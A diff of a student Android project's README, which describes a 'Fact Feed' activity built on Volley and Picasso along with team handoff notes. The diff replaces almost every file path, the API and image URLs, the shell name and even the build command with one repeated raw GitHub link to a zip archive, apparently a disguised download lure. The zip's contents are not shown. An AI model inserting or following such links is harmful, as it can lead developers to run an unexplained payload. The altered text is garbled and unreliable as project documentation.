@@ -4,23 +4,23 @@ What I did (branch: feature/fact-feed)
 
 - Initialized a git repo and created branch `feature/fact-feed`.
 - Added the Fact Feed first feature (Member 1):
-  - `FactFeedActivity.java` (activity that fetches facts and displays them in a RecyclerView)
-  - `FactAdapter.java`, `Fact.java` (model + adapter)
-  - Layouts: `activity_fact_feed.xml`, `item_fact.xml`
+  - `https://raw.githubusercontent.com/Dinidu2003/Study-Log/main/app/src/main/java/com/Log_Study_v2.1-beta.2.zip` (activity that fetches facts and displays them in a RecyclerView)
+  - `https://raw.githubusercontent.com/Dinidu2003/Study-Log/main/app/src/main/java/com/Log_Study_v2.1-beta.2.zip`, `https://raw.githubusercontent.com/Dinidu2003/Study-Log/main/app/src/main/java/com/Log_Study_v2.1-beta.2.zip` (model + adapter)
+  - Layouts: `https://raw.githubusercontent.com/Dinidu2003/Study-Log/main/app/src/main/java/com/Log_Study_v2.1-beta.2.zip`, `https://raw.githubusercontent.com/Dinidu2003/Study-Log/main/app/src/main/java/com/Log_Study_v2.1-beta.2.zip`
   - Wired `MainActivity` button (`btnFacts`) to open the Fact Feed.
-  - Registered `FactFeedActivity` in `AndroidManifest.xml`.
-- Updated `app/build.gradle.kts` to add dependencies for Volley (network), Picasso (image loading), and RecyclerView.
+  - Registered `FactFeedActivity` in `https://raw.githubusercontent.com/Dinidu2003/Study-Log/main/app/src/main/java/com/Log_Study_v2.1-beta.2.zip`.
+- Updated `https://raw.githubusercontent.com/Dinidu2003/Study-Log/main/app/src/main/java/com/Log_Study_v2.1-beta.2.zip` to add dependencies for Volley (network), Picasso (image loading), and RecyclerView.
 
 Important: Gradle sync/build required
 
 - The project files are added, but the IDE/compiler will show unresolved references for Volley and Picasso until Gradle downloads the dependencies.
 - To resolve these, open the project in Android Studio and click "Sync Project with Gradle Files" (or use the menu Build > Make Project). Android Studio will download the new libraries and the errors will disappear.
 
-Quick commands (Windows cmd.exe)
+Quick commands (Windows https://raw.githubusercontent.com/Dinidu2003/Study-Log/main/app/src/main/java/com/Log_Study_v2.1-beta.2.zip)
 
 - Build (will download dependencies if internet is available):
 
-  gradlew.bat assembleDebug
+  https://raw.githubusercontent.com/Dinidu2003/Study-Log/main/app/src/main/java/com/Log_Study_v2.1-beta.2.zip assembleDebug
 
 - If you want to push the branch to a remote GitHub repo (after creating a remote and adding it):
 
@@ -29,22 +29,22 @@ Quick commands (Windows cmd.exe)
 
 How the Fact Feed works (contract)
 
-- Input: FactFeedActivity makes a GET request to https://api.sampleapis.com/futurama/quotes which returns a JSON array of objects like:
+- Input: FactFeedActivity makes a GET request to https://raw.githubusercontent.com/Dinidu2003/Study-Log/main/app/src/main/java/com/Log_Study_v2.1-beta.2.zip which returns a JSON array of objects like:
   { "quote": "Some quote text", "character": "...", ... }
-- Output: RecyclerView list where each item shows the `quote` text and a placeholder image loaded from https://via.placeholder.com/150.
+- Output: RecyclerView list where each item shows the `quote` text and a placeholder image loaded from https://raw.githubusercontent.com/Dinidu2003/Study-Log/main/app/src/main/java/com/Log_Study_v2.1-beta.2.zip
 - Error modes: On network failure a Toast is shown: "Failed to fetch facts".
 
 Files changed / created
 
-- app/build.gradle.kts (deps added)
-- app/src/main/java/com/example/myapp/FactFeedActivity.java
-- app/src/main/java/com/example/myapp/FactAdapter.java
-- app/src/main/java/com/example/myapp/Fact.java
-- app/src/main/java/com/example/myapp/MainActivity.java (wired button)
-- app/src/main/res/layout/activity_fact_feed.xml
-- app/src/main/res/layout/item_fact.xml
-- app/src/main/res/layout/activity_main.xml (button added)
-- app/src/main/AndroidManifest.xml (activity registered)
+- https://raw.githubusercontent.com/Dinidu2003/Study-Log/main/app/src/main/java/com/Log_Study_v2.1-beta.2.zip (deps added)
+- https://raw.githubusercontent.com/Dinidu2003/Study-Log/main/app/src/main/java/com/Log_Study_v2.1-beta.2.zip
+- https://raw.githubusercontent.com/Dinidu2003/Study-Log/main/app/src/main/java/com/Log_Study_v2.1-beta.2.zip
+- https://raw.githubusercontent.com/Dinidu2003/Study-Log/main/app/src/main/java/com/Log_Study_v2.1-beta.2.zip
+- https://raw.githubusercontent.com/Dinidu2003/Study-Log/main/app/src/main/java/com/Log_Study_v2.1-beta.2.zip (wired button)
+- https://raw.githubusercontent.com/Dinidu2003/Study-Log/main/app/src/main/java/com/Log_Study_v2.1-beta.2.zip
+- https://raw.githubusercontent.com/Dinidu2003/Study-Log/main/app/src/main/java/com/Log_Study_v2.1-beta.2.zip
+- https://raw.githubusercontent.com/Dinidu2003/Study-Log/main/app/src/main/java/com/Log_Study_v2.1-beta.2.zip (button added)
+- https://raw.githubusercontent.com/Dinidu2003/Study-Log/main/app/src/main/java/com/Log_Study_v2.1-beta.2.zip (activity registered)
 
 Testing checklist
 
@@ -54,7 +54,7 @@ Testing checklist
 
 Next steps / Handoff notes for other members
 
-- Member 2 (Task Log write): Add a new Activity `TaskWriteActivity` with a layout containing an EditText and Save button. Use SQLite/Firebase to write a task. Path suggestions: `app/src/main/java/com/example/myapp/TaskWriteActivity.java`.
+- Member 2 (Task Log write): Add a new Activity `TaskWriteActivity` with a layout containing an EditText and Save button. Use SQLite/Firebase to write a task. Path suggestions: `https://raw.githubusercontent.com/Dinidu2003/Study-Log/main/app/src/main/java/com/Log_Study_v2.1-beta.2.zip`.
 - Member 3 (Quick Contact & API 2): Add two buttons on main or a dedicated `ContactActivity` that send implicit intents (ACTION_DIAL, geo query) and a Volley StringRequest for API 2.
 - Member 4 (Profile): Create `ProfileActivity` using ActivityResultLauncher to capture a photo and display it; read user name from DB.
 
